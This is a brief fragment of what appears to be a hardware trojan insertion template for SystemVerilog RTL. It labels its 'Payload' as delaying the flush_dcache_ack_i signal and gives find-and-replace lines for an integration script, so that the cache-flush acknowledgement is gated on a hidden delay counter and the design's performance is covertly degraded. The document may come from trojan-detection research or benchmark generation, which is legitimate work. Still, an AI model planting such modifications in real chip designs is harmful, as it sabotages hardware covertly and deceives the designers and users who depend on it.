 ...
 * Payload: Delay flush_dcache_ack_i by N cycles
 * 
...
// ============================================================
// Performance Degradation: Delay flush_dcache_ack_i by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF flush_dcache_ack_i is a ready/valid signal:
//   Find: assign flush_dcache_ack_i = ready_condition;
//   Replace: assign flush_dcache_ack_i = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF flush_dcache_ack_i is in always_ff:
//   Find: flush_dcache_ack_i <= ready_value;
//   Replace: flush_dcache_ack_i <= (delay_counter == 0) ? ready_value : 1'b0;